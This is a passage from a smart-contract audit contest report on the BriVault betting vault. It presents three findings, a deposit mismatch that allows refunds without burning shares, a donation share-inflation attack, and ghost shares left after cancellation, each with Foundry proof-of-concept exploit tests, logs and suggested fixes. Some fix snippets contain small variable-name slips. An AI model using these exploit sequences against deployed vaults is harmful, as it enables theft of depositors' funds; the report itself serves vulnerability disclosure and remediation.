## <a id='H-05'></a>H-05. Mismatched receiver vs sender in deposit enables refund without burning shares

_Submitted by [stevenalenga](https://profiles.cyfrin.io/u/stevenalenga), [galer ah](https://codehawks.cyfrin.io/team/cmh3d0b9c0003ie04ijmposlh), [yxsec](https://profiles.cyfrin.io/u/yxsec), [hark017](https://profiles.cyfrin.io/u/hark017), [fawarano](https://profiles.cyfrin.io/u/fawarano), [ishaanbansal2312](https://profiles.cyfrin.io/u/ishaanbansal2312), [0p71m4lpr1m3](https://profiles.cyfrin.io/u/0p71m4lpr1m3), [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [iamgeorgi](https://profiles.cyfrin.io/u/iamgeorgi), [eliab256](https://profiles.cyfrin.io/u/eliab256), [raminidalf](https://profiles.cyfrin.io/u/raminidalf), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [eagerpanda582](https://profiles.cyfrin.io/u/eagerpanda582), [0xzulkefal](https://profiles.cyfrin.io/u/0xzulkefal), [osamaebaid](https://profiles.cyfrin.io/u/osamaebaid), [mafa](https://profiles.cyfrin.io/u/mafa), [hcrlen](https://profiles.cyfrin.io/u/hcrlen), [sulfurpt](https://profiles.cyfrin.io/u/sulfurpt), [ishwar](https://profiles.cyfrin.io/u/ishwar), [jopantech](https://profiles.cyfrin.io/u/jopantech), [sidd](https://profiles.cyfrin.io/u/sidd), [3mr_obito4](https://profiles.cyfrin.io/u/3mr_obito4), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [ynyesto](https://profiles.cyfrin.io/u/ynyesto), [ciphermalware](https://profiles.cyfrin.io/u/ciphermalware), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [rbd3](https://profiles.cyfrin.io/u/rbd3), [minionteechs](https://profiles.cyfrin.io/u/minionteechs), [nkh000](https://profiles.cyfrin.io/u/nkh000), [chain__warden](https://profiles.cyfrin.io/u/chain__warden), [valya](https://profiles.cyfrin.io/u/valya), [zhangyumeng171](https://profiles.cyfrin.io/u/zhangyumeng171), [bkawira](https://profiles.cyfrin.io/u/bkawira), [wyd_derick](https://profiles.cyfrin.io/u/wyd_derick), [0x_bob_0x](https://profiles.cyfrin.io/u/0x_bob_0x), [objectplayer](https://profiles.cyfrin.io/u/objectplayer), [aliismakh](https://profiles.cyfrin.io/u/aliismakh), [neomartis](https://profiles.cyfrin.io/u/neomartis), [eze001](https://profiles.cyfrin.io/u/eze001), [jericho](https://profiles.cyfrin.io/u/jericho), [kode_n_rolla](https://profiles.cyfrin.io/u/kode_n_rolla), [shashankwcw](https://profiles.cyfrin.io/u/shashankwcw), [hugoh](https://profiles.cyfrin.io/u/hugoh), [darkfox](https://profiles.cyfrin.io/u/darkfox), [zhongguangyang0907](https://profiles.cyfrin.io/u/zhongguangyang0907), [elo_anxiety](https://profiles.cyfrin.io/u/elo_anxiety), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [xgrybto](https://profiles.cyfrin.io/u/xgrybto), [farnad](https://profiles.cyfrin.io/u/farnad), [jufel](https://profiles.cyfrin.io/u/jufel), [jfornells](https://profiles.cyfrin.io/u/jfornells). Selected submission by: [0xscratch](https://profiles.cyfrin.io/u/0xscratch)._      
            


# Root + Impact

## Description

* This contract lets any user deposit assets using the `briVault.deposit()` function, which stores the assets staked to `briVault.stakedAsset` mapping, and mint shares accordingly.

* However, within this same function, there's a weird mismatch that can lead to a severe vulnerability. Actually, the `deposit()` requires the user to pass a `receiver` address along with the `assets` amount.

* On line 222, the contract maps the staked assets to the receiver using `stakedAsset[receiver] = stakeAsset`, whereas on line 231, it mints the shares to `msg.sender` using `_mint(msg.sender, participantShares)`. Therefore, this will create a situation where assets are staked to one account, and shares are minted to the other.

* Additionally, an attacker can take this to their own benefit due to the availability of the `cancelParticipation()` function, which lets anyone get their assets back by burning shares.

  ```solidity
  function deposit(uint256 assets, address receiver) public override returns (uint256) {
      // ...
      uint256 stakeAsset = assets - fee;
  @>  stakeAsset[receiver] = stakeAsset;

      // ...

  @>  _mint(msg.sender, participantShares); // mints shares to msg.sender (not receiver)
      // ...
  }

  function cancelParticipation () public  {
      if (block.timestamp >= eventStartDate){
         revert eventStarted();
      }

      uint256 refundAmount = stakedAsset[msg.sender];

  @>  stakedAsset[msg.sender] = 0; // clears stake

  @>  uint256 shares = balanceOf(msg.sender);
      
  @>  _burn(msg.sender, shares); // burns ALL shares; can be 0 while still refunding

      IERC20(asset()).safeTransfer(msg.sender, refundAmount);
  }
  ```

## Risks

**Likelihood: High**

* No restriction on third-party deposits (receiver ≠ msg.sender).

* Easy to execute with two EOAs; no special timing required (just before event start).

**Impact: High**

* The attacker gains profit, especially when they are the winner.

* The attacker plays with a lower risk than others, since he has already gained his assets back. Doesn't have much to lose, even if he loses the bet.

* Moreover, there are some chances of other withdrawers being denied their winner prize share.

## Proof of Concept

* Here's how the attack unfolds:

  1. **The Setup:**

     * Attacker controls two users: `user1` and `user2`.

     * Two other innocent users, `user3` and `user4` comes later into the picture.
  2. **Initiating the Exploit:**

     * Through `user1`, attacker deposits `0.00025e18` tokens to the vault with `receiver = user1`. Thus minting shares to himself.

     * Next, again using `user1`, attacker deposits `5e18` tokens to the vault with `receiver = user2`. With this, shares again got minted to `user1`, but `stakedAsset` mapped those assets to `user2`, due to the vulnerable mismatch.

     * Then, `user1` joins the event with the combined share value of both deposits made above.
  3. **The Twist:**

     * Before even the event starts, `user2` calls the `cancelParticipation()` function, which sent `user2` the assets i.e. `5e18 - fee`, and burnt the shares. But wait, `user2` doesn't have any shares under his name, so it burned literally 0 shares.

     * However, the `briVault.balanceOf(user1)` still gives the same shares as before. The attacker has literally nothing to lose now, as he is refunded and is also part of the event with the same share amount.
  4. **How worse can it get?**

     * Well, if the attacker becomes lucky and wins the event, then he will be getting assets of other withdrawers, that's because the vault will have more shares minted as compared to the `totalAssets`. So, it's obvious that the attacker will eat up other funds.

     * This can even lead to other winners being denied their withdrawals due to a low balance.

  <br />

* Add the `test_UsersSharesNotBurnedButAssetsReturned` test to `briVault.t.sol`:

  ```Solidity
  function test_UsersSharesNotBurnedButAssetsReturned() public {
      // setup
      vm.prank(owner);
      briVault.setCountry(countries);

      // Attackers hold 2 accounts, user1, user2
      // 1. User1 deposits a small amount under his own name, let's say 0.00025 ether (bare minimum)
      // 2 Then deposits again, 5 ether in the name of user2
      // 3. Joins the event
      vm.startPrank(user1);
      mockToken.approve(address(briVault), type(uint256).max);
      briVault.deposit(0.00025 ether, user1);
      briVault.deposit(5 ether, user2);
      briVault.joinEvent(10);
      vm.stopPrank();

      // Checking who holds what
      console.log("User1 assets:", mockToken.balanceOf(user1));
      console.log("User2 assets:", mockToken.balanceOf(user2));
      console.log();
      console.log("User1 shares:", briVault.balanceOf(user1));
      console.log("User2 shares:", briVault.balanceOf(user2));

      console.log();
      console.log("But here's the twist...");
      console.log();
      
      console.log("User1 staked Assets:", briVault.stakedAsset(user1));
      console.log("User2 staked Assets:", briVault.stakedAsset(user2));

      // Now, user2 can easily call `cancelParticipation`
      // Even though it never joined the event. But why?
      // Let's see...
      vm.prank(user2);
      briVault.cancelParticipation();

      // Checking the balances, again
      console.log();
      console.log("After user2 calls `cancelParticipation()`");
      console.log();
      console.log("User1 assets:", mockToken.balanceOf(user1));
      console.log("User2 assets:", mockToken.balanceOf(user2));
      console.log();
      console.log("User1 shares:", briVault.balanceOf(user1));
      console.log("User2 shares:", briVault.balanceOf(user2));

      // So, the 2nd account of the attacker (i.e. user2) got its refund already, which was deposited by user1
      // However, the attacker's first account, i.e. user1, still holds the shares and is already part of the event.
  }
  ```

  <br />

* Run the test using the following command:

  ```bash
  forge test --mt test_UsersSharesNotBurnedButAssetsReturned -vv
  ```

  <br />

* Logs:

  ```log
  Ran 1 test for test/briVault.t.sol:BriVaultTest
  [PASS] test_UsersSharesNotBurnedButAssetsReturned() (gas: 1723569)
  Logs:
  User1 assets: 14999750000000000000
  User2 assets: 20000000000000000000

  User1 shares: 4925246250000000000
  User2 shares: 0

  But here's the twist...

  User1 staked Assets: 246250000000000
  User2 staked Assets: 4925000000000000000

  After user2 calls `cancelParticipation()`

  User1 assets: 14999750000000000000
  User2 assets: 24925000000000000000

  User1 shares: 4925246250000000000
  User2 shares: 0

  Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.09ms (1.11ms CPU time)
  ```

## Recommended Mitigation

* As mentioned, replace `msg.sender` with `receiver` on line 231

  ```diff
  function deposit(uint256 assets, address receiver) public override returns (uint256) {
      // ...

  -   _mint(msg.sender, participantShares);
  +   _mint(receiver, participantShares);

      // ...
  }
  ```

  <br />

* Harden `cancelParticipation()` so refunds are tied to the stake-backed shares and can’t be refunded with 0 burn:

  ```diff
  function cancelParticipation () public  {
      if (block.timestamp >= eventStartDate){
         revert eventStarted();
      }

      uint256 refundAmount = stakedAsset[msg.sender];
  +   require(refundAmount > 0, "no stake");

  -   stakedAsset[msg.sender] = 0;

  -   uint256 shares = balanceOf(msg.sender);
      
  -   _burn(msg.sender, shares);

  +   // burn exactly the shares corresponding to the staked assets
  +   uint256 requiredShares = _convertToShares(refundAssets);
  +   require(balanceOf(msg.sender) >= requiredShares, "insufficient shares to refund");
  +   _burn(msg.sender, requiredShares);

  +   stakedAsset[msg.sender] = 0;
      IERC20(asset()).safeTransfer(msg.sender, refundAmount);
  }
  ```

## <a id='H-06'></a>H-06. Share Calculation Can Be Manipulated via Direct Transfers, Leading to Unfair Share Pricing and Potential Loss of Value for Users

_Submitted by [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0), [xrave110](https://profiles.cyfrin.io/u/xrave110), [cryptostellar5](https://profiles.cyfrin.io/u/cryptostellar5), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [dpedpe](https://profiles.cyfrin.io/u/dpedpe), [eagerpanda582](https://profiles.cyfrin.io/u/eagerpanda582), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [ishwar](https://profiles.cyfrin.io/u/ishwar), [0xvrka](https://profiles.cyfrin.io/u/0xvrka), [osamaebaid](https://profiles.cyfrin.io/u/osamaebaid), [ynyesto](https://profiles.cyfrin.io/u/ynyesto), [0xnetero](https://profiles.cyfrin.io/u/0xnetero), [hunterspartan5](https://profiles.cyfrin.io/u/hunterspartan5), [0xki](https://profiles.cyfrin.io/u/0xki), [hcrlen](https://profiles.cyfrin.io/u/hcrlen), [0xarinaitwe](https://profiles.cyfrin.io/u/0xarinaitwe), [kanyoro](https://profiles.cyfrin.io/u/kanyoro), [zhangyumeng171](https://profiles.cyfrin.io/u/zhangyumeng171), [bugnetter](https://profiles.cyfrin.io/u/bugnetter), [al88nsk](https://profiles.cyfrin.io/u/al88nsk), [icis](https://profiles.cyfrin.io/u/icis), [neomartis](https://profiles.cyfrin.io/u/neomartis), [rbd3](https://profiles.cyfrin.io/u/rbd3), [fredo182](https://profiles.cyfrin.io/u/fredo182), [arudop](https://profiles.cyfrin.io/u/arudop), [gurmeetkalyan](https://profiles.cyfrin.io/u/gurmeetkalyan), [drmanhattan852](https://profiles.cyfrin.io/u/drmanhattan852), [rodribogado50](https://profiles.cyfrin.io/u/rodribogado50), [nugen](https://profiles.cyfrin.io/u/nugen), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [hawksvision](https://profiles.cyfrin.io/u/hawksvision), [jufel](https://profiles.cyfrin.io/u/jufel). Selected submission by: [wojack0x0](https://profiles.cyfrin.io/u/wojack0x0)._      
            


# Root + Impact

* **Root:** The custom `_convertToShares` function calculates share prices based on the raw token balance of the contract (`asset.balanceOf(address(this))`), which can be artificially inflated by direct `transfer` calls (donations).

* **Impact:** An early depositor can manipulate the share price to be extremely high. Subsequent depositors will then receive far fewer shares than the fair value of their assets, and in minimal configurations, can receive zero shares, effectively losing their entire deposit to the vault. This breaks the fundamental fairness of the ERC4626 vault standard.

## Description

A core promise of an ERC4626 vault is that the number of shares minted should fairly represent the value of the assets deposited. The `BriVault` contract implements a custom share calculation mechanism that is vulnerable to a well-known inflation attack.

The `_convertToShares` function uses the contract's live token balance to determine the price of a share. An attacker can exploit this by:

1. Depositing a very small amount of assets to mint a small number of initial shares (e.g., 1 share for 1 wei).
2. Directly transferring a large amount of the underlying asset to the contract address. This inflates the `asset.balanceOf(address(this))` without creating any new shares.
3. As a result, the calculated price per share becomes astronomically high.

When a legitimate user (the victim) subsequently makes a large deposit, the `Math.mulDiv` calculation in `_convertToShares` rounds down significantly due to the manipulated ratio.

* **Under minimal fee/deposit configurations:** The victim can receive **zero shares**, losing their entire deposit.

* **Under the project's default configurations:** The victim receives a positive but unfairly small number of shares, meaning they have significantly overpaid for their portion of the vault.

This vulnerability undermines the economic safety of the vault and can lead to a direct loss of value for users.

```solidity
// src/briVault.sol

function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
    // @> `balanceOfVault` is read directly and can be manipulated by external transfers.
    uint256 balanceOfVault = IERC20(asset()).balanceOf(address(this));
    uint256 totalShares = totalSupply();

    if (totalShares == 0 || balanceOfVault == 0) {
        return assets;
    }

    // @> If `balanceOfVault` is artificially inflated, the result of this division
    // @> can round down to zero for the victim, or result in an unfair price.
    shares = Math.mulDiv(assets, totalShares, balanceOfVault);
}

function deposit(uint256 assets, address receiver) public override returns (uint256) {
    // ...
    uint256 participantShares = _convertToShares(stakeAsset);
    // ...
    _mint(msg.sender, participantShares);
    // @> There is no check to ensure `participantShares > 0`, allowing a user
    // @> to deposit assets and receive nothing in return.
}
```

## Risk

**Likelihood**: High

* This is a well-documented attack vector for non-standard ERC4626 implementations. It can be executed by any user who is able to be the first or an early depositor.

**Impact**: High

* **Significant Financial Loss for Users:** Users can lose a substantial portion or, in some cases, all of their deposited funds' value by receiving far too few shares or zero shares.

* **Broken Core Vault Mechanics:** The vault fails its primary function of fairly representing deposited assets with tokenized shares, destroying trust in the protocol's accounting.

## Proof of Concept

The following tests validate the vulnerability under two different configurations, demonstrating its severity and practicality.

* **Test A (`test_donationAttack_minimalConfig_victimGetsZeroShares`)** proves that with minimal fees and deposit requirements, the victim receives zero shares, leading to a complete loss of their deposited assets.

* **Test B (`test_donationAttack_defaultConfig_victimGetsPositiveButReducedShares`)** proves that even under the project's default settings, the victim receives an unfairly low number of shares, demonstrating the price manipulation.

```solidity
// test/ShareDonationAttack.t.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

/**
 * Realistic PoC tests against the actual BriVault contract to validate
 * the donation/inflation attack described in Ai_Studio_Reports/333.md.
 *
 * Notes:
 * - Comments are in English.
 * - Console outputs are plain English (no hex, no icons).
 * - Tests live in a separate file to avoid build issues.
 */
contract ShareDonationAttackTest is Test {
    // Common test actors
    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    // Token and vault under test
    MockERC20 internal mockToken;
    BriVault internal briVault;

    // Baseline tournament params
    uint256 internal eventStartDate;
    uint256 internal eventEndDate;
    address internal feeAddr;

    function setUp() public {
        // Deploy mock token and mint balances
        mockToken = new MockERC20("Mock Token", "MTK");
        mockToken.mint(owner, 1_000 ether);
        mockToken.mint(attacker, 1_000 ether);
        mockToken.mint(victim, 1_000 ether);

        // Tournament window (future start)
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 30 days;
        feeAddr = makeAddr("feeAddr");
    }

    /**
     * Case A: Minimal configuration that matches the report’s scenario
     * - participationFeeBsp = 0 (to focus on share math)
     * - minimumAmount = 0 (allows 1 wei first deposit)
     * Outcome: Victim receives 0 shares due to donation-inflated vault balance.
     */
    function test_donationAttack_minimalConfig_victimGetsZeroShares() public {
        // Deploy a vault configured to allow tiny initial deposit
        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            0, // participationFeeBsp
            eventStartDate,
            feeAddr,
            0, // minimumAmount
            eventEndDate
        );
        vm.stopPrank();

        // Approvals
        vm.prank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        vm.prank(victim);
        mockToken.approve(address(briVault), type(uint256).max);

        // 1) Attacker is the first depositor with 1 wei -> mints 1 share
        vm.startPrank(attacker);
        uint256 attackerInitialDeposit = 1; // 1 wei
        uint256 attackerShares = briVault.deposit(attackerInitialDeposit, attacker);
        vm.stopPrank();

        console.log("Attacker minted shares:", attackerShares); // Expect 1
        assertEq(attackerShares, 1, "First depositor should mint 1 share");
        assertEq(briVault.balanceOf(attacker), 1, "Attacker owns 1 share");

        // 2) Attacker donates a large amount directly to the vault
        vm.prank(attacker);
        uint256 attackerDonation = 100 ether; // large donation inflates vault balance
        mockToken.transfer(address(briVault), attackerDonation);

        uint256 vaultBalanceAfterDonation = mockToken.balanceOf(address(briVault));
        console.log("Vault balance after donation:", vaultBalanceAfterDonation);
        console.log("Total shares after donation:", briVault.totalSupply()); // Still 1

        // 3) Victim deposits a large amount but receives 0 shares due to rounding down
        vm.startPrank(victim);
        uint256 victimDeposit = 10 ether;
        uint256 victimShares = briVault.deposit(victimDeposit, victim);
        vm.stopPrank();

        console.log("Victim deposited:", victimDeposit);
        console.log("Victim received shares:", victimShares);
        assertEq(victimShares, 0, "Victim should receive 0 shares under donation attack");
        assertEq(briVault.balanceOf(victim), 0, "Victim owns 0 shares");
    }

    /**
     * Case B: Default-like configuration used in project tests
     * - participationFeeBsp = 150 (1.5%)
     * - minimumAmount = 0.0002 ether
     * Outcome: Victim receives positive shares (not zero), but share issuance
     *          is still manipulated by donation (unfair pricing).
     */
    function test_donationAttack_defaultConfig_victimGetsPositiveButReducedShares() public {
        // Deploy a vault with default-like parameters seen in existing tests
        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            150, // 1.5%
            eventStartDate,
            feeAddr,
            0.0002 ether, // minimumAmount
            eventEndDate
        );
        vm.stopPrank();

        // Approvals
        vm.prank(attacker);
        mockToken.approve(address(briVault), type(uint256).max);
        vm.prank(victim);
        mockToken.approve(address(briVault), type(uint256).max);

        // 1) Attacker first deposit with a non-trivial amount (respects minimum + fee)
        vm.startPrank(attacker);
        uint256 attackerAssets = 1 ether;
        uint256 attackerShares = briVault.deposit(attackerAssets, attacker);
        vm.stopPrank();

        console.log("Attacker minted shares (default config):", attackerShares);
        assertGt(attackerShares, 0, "Attacker should mint > 0 shares at start");

        // 2) Attacker donates a large amount to inflate vault balance
        vm.prank(attacker);
        uint256 donation = 100 ether;
        mockToken.transfer(address(briVault), donation);
        console.log("Vault balance after donation (default):", mockToken.balanceOf(address(briVault)));

        // 3) Victim deposits a large amount; receives >0 shares but unfairly reduced
        vm.startPrank(victim);
        uint256 victimAssets = 10 ether;
        uint256 victimShares = briVault.deposit(victimAssets, victim);
        vm.stopPrank();

        console.log("Victim shares (default config):", victimShares);
        assertGt(victimShares, 0, "Victim should receive > 0 shares with non-trivial totalSupply");
        // Sanity check: price inflation reduces shares per asset for the victim.
        // We expect victim shares to be much smaller than their asset amount due to inflated vault balance.
        assertLt(victimShares, attackerShares, "Victim shares per deposit are reduced vs first depositor");
    }
}
```

**Test Results:**

```bash
➜  2025-11-brivault git:(main) ✗ forge test --match-contract ShareDonationAttac
kTest -vv

Ran 2 tests for test/ShareDonationAttack.t.sol:ShareDonationAttackTest
[PASS] test_donationAttack_defaultConfig_victimGetsPositiveButReducedShares() (gas: 3825147)
Logs:
  Attacker minted shares (default config): 985000000000000000
  Vault balance after donation (default): 100985000000000000000
  Victim shares (default config): 96076149923255929

[PASS] test_donationAttack_minimalConfig_victimGetsZeroShares() (gas: 3753199)
Logs:
  Attacker minted shares: 1
  Vault balance after donation: 100000000000000000001
  Total shares after donation: 1
  Victim deposited: 10000000000000000000
  Victim received shares: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 5.65ms (4.52ms CPU time)
```

## Recommended Mitigation

The contract should not use a custom, vulnerable share calculation. It should either adopt the battle-tested OpenZeppelin ERC4626 implementation, which includes mitigations for this attack, or implement similar protections.

**Recommended Fix: Align with Secure ERC4626 Practices**

1. Remove the custom `_convertToShares` function.
2. Override `totalAssets()` to correctly report the vault's underlying assets.
3. Use the inherited, secure `_deposit` function from the OpenZeppelin contract.
4. Add a critical check to ensure that a deposit results in at least one share.

```diff
// src/briVault.sol

contract BriVault is ERC4626, Ownable {
    // ...

-   function _convertToShares(uint256 assets) internal view returns (uint256 shares) {
-       uint256 balanceOfVault = IERC20(asset()).balanceOf(address(this));
-       uint256 totalShares = totalSupply();
-       if (totalShares == 0 || balanceOfVault == 0) {
-           return assets;
-       }
-       shares = Math.mulDiv(assets, totalShares, balanceOfVault);
-   }

+   function totalAssets() public view virtual override returns (uint256) {
+       // This should reflect the total assets managed by the vault.
+       // For this simple vault, it's the contract's balance.
+       return asset().balanceOf(address(this));
+   }

    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        // ... (fee calculation and checks remain) ...
        uint256 stakeAsset = assets - fee;

+       // Use the preview function from the standard ERC4626 implementation
+       uint256 shares = previewDeposit(stakeAsset);
+       require(shares > 0, "BriVault: zero shares minted");

        stakedAsset[receiver] = stakeAsset;

        IERC20(asset()).safeTransferFrom(msg.sender, participationFeeAddress, fee);

-       // Manual asset transfer and minting are replaced by the secure internal function
-       IERC20(asset()).safeTransferFrom(msg.sender, address(this), stakeAsset);
-       _mint(msg.sender, participantShares);
+       // The _deposit function handles the asset transfer and minting safely
+       _deposit(msg.sender, receiver, stakeAsset, shares);

        emit deposited(receiver, stakeAsset);
-       return participantShares;
+       return shares;
    }

    // ...
}
```


# Medium Risk Findings

## <a id='M-01'></a>M-01. cancelParticipation() Leaves Ghost State, Inflating totalWinnerShares

_Submitted by [galer ah](https://codehawks.cyfrin.io/team/cmh3d0b9c0003ie04ijmposlh), [calvinkimani](https://profiles.cyfrin.io/u/calvinkimani), [yxsec](https://profiles.cyfrin.io/u/yxsec), [mostafapahlevani93](https://profiles.cyfrin.io/u/mostafapahlevani93), [dpedpe](https://profiles.cyfrin.io/u/dpedpe), [0xzulkefal](https://profiles.cyfrin.io/u/0xzulkefal), [0xscratch](https://profiles.cyfrin.io/u/0xscratch), [shivanageshwarrao93](https://profiles.cyfrin.io/u/shivanageshwarrao93), [agilegypsy](https://profiles.cyfrin.io/u/agilegypsy), [0xvrka](https://profiles.cyfrin.io/u/0xvrka), [hunterspartan5](https://profiles.cyfrin.io/u/hunterspartan5), [shalinshah130](https://profiles.cyfrin.io/u/shalinshah130), [ynyesto](https://profiles.cyfrin.io/u/ynyesto), [aziz0x48](https://profiles.cyfrin.io/u/aziz0x48), [snufflesrea](https://profiles.cyfrin.io/u/snufflesrea), [themilenkov](https://profiles.cyfrin.io/u/themilenkov), [0xsnoweth](https://profiles.cyfrin.io/u/0xsnoweth), [fawarano](https://profiles.cyfrin.io/u/fawarano), [0xarinaitwe](https://profiles.cyfrin.io/u/0xarinaitwe), [zhangyumeng171](https://profiles.cyfrin.io/u/zhangyumeng171), [adrianheldesai](https://profiles.cyfrin.io/u/adrianheldesai), [al88nsk](https://profiles.cyfrin.io/u/al88nsk), [avspedaliere](https://profiles.cyfrin.io/u/avspedaliere), [ke5haav](https://profiles.cyfrin.io/u/ke5haav), [bigchapo21](https://profiles.cyfrin.io/u/bigchapo21), [nkh000](https://profiles.cyfrin.io/u/nkh000), [objectplayer](https://profiles.cyfrin.io/u/objectplayer), [bkawira](https://profiles.cyfrin.io/u/bkawira), [neomartis](https://profiles.cyfrin.io/u/neomartis), [eze001](https://profiles.cyfrin.io/u/eze001), [fredo182](https://profiles.cyfrin.io/u/fredo182), [mnusurov](https://profiles.cyfrin.io/u/mnusurov), [chain__warden](https://profiles.cyfrin.io/u/chain__warden), [yogiemoji](https://profiles.cyfrin.io/u/yogiemoji), [shashankwcw](https://profiles.cyfrin.io/u/shashankwcw), [rodribogado50](https://profiles.cyfrin.io/u/rodribogado50), [chobby](https://profiles.cyfrin.io/u/chobby), [defiak](https://profiles.cyfrin.io/u/defiak), [0xnaresh](https://profiles.cyfrin.io/u/0xnaresh), [0xliltee](https://profiles.cyfrin.io/u/0xliltee), [zhongguangyang0907](https://profiles.cyfrin.io/u/zhongguangyang0907), [icis](https://profiles.cyfrin.io/u/icis), [luigi](https://profiles.cyfrin.io/u/luigi), [accessdenied](https://profiles.cyfrin.io/u/accessdenied), [aliismakh](https://profiles.cyfrin.io/u/aliismakh), [s3mvl4d](https://profiles.cyfrin.io/u/s3mvl4d), [jfornells](https://profiles.cyfrin.io/u/jfornells), [jufel](https://profiles.cyfrin.io/u/jufel), [farnad](https://profiles.cyfrin.io/u/farnad), [tiannah](https://profiles.cyfrin.io/u/tiannah). Selected submission by: [calvinkimani](https://profiles.cyfrin.io/u/calvinkimani)._      
            


# Root + Impact

## Description

The incomplete state cleanup in `BriVault.sol::cancelParticipation()` will cause a loss of winnings for legitimate winners as an attacker will deposit, join, and cancel to get a full refund while leaving ghost share data that inflates `totalWinnerShares`, reducing all winners' payouts with zero cost to the attacker.\*\*

In [`BriVault.sol:275-289`](https://github.com/CodeHawks-Contests/2025-11-brivault/blob/main/src/briVault.sol#L275-L289), the `cancelParticipation()` function only partially cleans up user state:

```solidity
function cancelParticipation () public  {
    if (block.timestamp >= eventStartDate){
       revert eventStarted();
    }

    uint256 refundAmount = stakedAsset[msg.sender];

    stakedAsset[msg.sender] = 0;  // Cleared

    uint256 shares = balanceOf(msg.sender);
    _burn(msg.sender, shares);  // Shares burned

    IERC20(asset()).safeTransfer(msg.sender, refundAmount);  // Refund sent
}
```

**Missing cleanup:**

* `usersAddress[]` still contains user's address

* `userToCountry[user]` still has team selection

* `userSharesToCountry[user][countryId]` still has old share count

* `numberOfParticipants` not decremented

* `totalParticipantShares` not reduced

This creates "ghost shares" because `_getWinnerShares()` (lines 191-198) iterates through the `usersAddress[]` array:

```solidity
function _getWinnerShares () internal returns (uint256) {
    for (uint256 i = 0; i < usersAddress.length; ++i){
        address user = usersAddress[i];
        totalWinnerShares += userSharesToCountry[user][winnerCountryId];  // Counts ghost shares!
    }
    return totalWinnerShares;
}
```

Even though the user has:

* Zero actual shares (`balanceOf(user) == 0`)

* Received full refund

* No stake in the outcome

Their old `userSharesToCountry[]` values are still counted in `totalWinnerShares`, inflating the denominator and reducing everyone's payouts.

## Risk

**Likelihood**:

1. Owner needs to call `setCountry()` to initialize teams array
2. Attacker needs to have deposited at least `minimumAmount + participationFee` worth of assets
3. Attacker needs to call `joinEvent()` before calling `cancelParticipation()`
4. Event must not have started yet (`block.timestamp < eventStartDate`)

**Impact**:

Legitimate winners suffer an approximate loss proportional to the ghost share inflation, while the attacker loses only the participation fee (1.5% × deposit × iterations).

## Proof of Concept

Attacker deposits, joins event, then cancels to get full refund.  However, cancelParticipation() doesn't clean up joinEvent state:

* usersAddress\[] still contains attacker

* userSharesToCountry\[] still has old share values

When \_getWinnerShares() loops through usersAddress\[], it counts ghost shares, inflating totalWinnerShares and reducing all legitimate winners' payouts.

```solidity
    function test_InflatedShares_CancelParticipationRepeated() public {
        // Victim deposits and joins
        vm.startPrank(victim);
        token.approve(address(vault), 10 ether);
        vault.deposit(10 ether, victim);
        vault.joinEvent(0);
        uint256 victimShares = vault.balanceOf(victim);
        vm.stopPrank();

        // Attacker repeats deposit -> join -> cancel 10 times
        vm.startPrank(attacker);
        token.approve(address(vault), 1000 ether);

        uint256 depositAmount = 50 ether;

        for (uint256 i = 0; i < 10; i++) {
            vault.deposit(depositAmount, attacker);
            vault.joinEvent(0);
            vault.cancelParticipation();
        }

        vm.stopPrank();

        // Fast forward and set winner
        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        vault.setWinner(0);

        uint256 totalWinnerShares = vault.totalWinnerShares();

        // Verify massive inflation
        assertTrue(totalWinnerShares > victimShares * 10, "Should be inflated by 10x+ ghost shares");

        uint256 vaultBalance = token.balanceOf(address(vault));
        uint256 victimPayout = (victimShares * vaultBalance) / totalWinnerShares;
        uint256 victimExpected = vaultBalance;

        // Verify severe payout reduction
        assertTrue(victimPayout < victimExpected / 10, "Victim should receive <10% of expected");
        assertGt(victimExpected - victimPayout, 0, "Significant loss should occur");
    }
```

## Recommended Mitigation

Clean up all state when user cancels participation:

```diff
function cancelParticipation () public  {
    if (block.timestamp >= eventStartDate){
       revert eventStarted();
    }

    uint256 refundAmount = stakedAsset[msg.sender];

    stakedAsset[msg.sender] = 0;

    uint256 shares = balanceOf(msg.sender);
    _burn(msg.sender, shares);

+   // Clean up join event state
+   if (bytes(userToCountry[msg.sender]).length > 0) {
+       // Find user's country ID
+       for (uint256 i = 0; i < teams.length; i++) {
+           if (keccak256(abi.encodePacked(teams[i])) == keccak256(abi.encodePacked(userToCountry[msg.sender]))) {
+               userSharesToCountry[msg.sender][i] = 0;
+               break;
+           }
+       }
+
+       delete userToCountry[msg.sender];
+
+       // Remove from usersAddress array (swap and pop)
+       for (uint256 i = 0; i < usersAddress.length; i++) {
+           if (usersAddress[i] == msg.sender) {
+               usersAddress[i] = usersAddress[usersAddress.length - 1];
+               usersAddress.pop();
+               break;
+           }
+       }
+
+       numberOfParticipants--;
+       totalParticipantShares -= shares;
+   }

    IERC20(asset()).safeTransfer(msg.sender, refundAmount);
}
```

## <a id='M-02'></a>M-02. `joinEvent` function cannot prevent DOS caused by excessive participating users

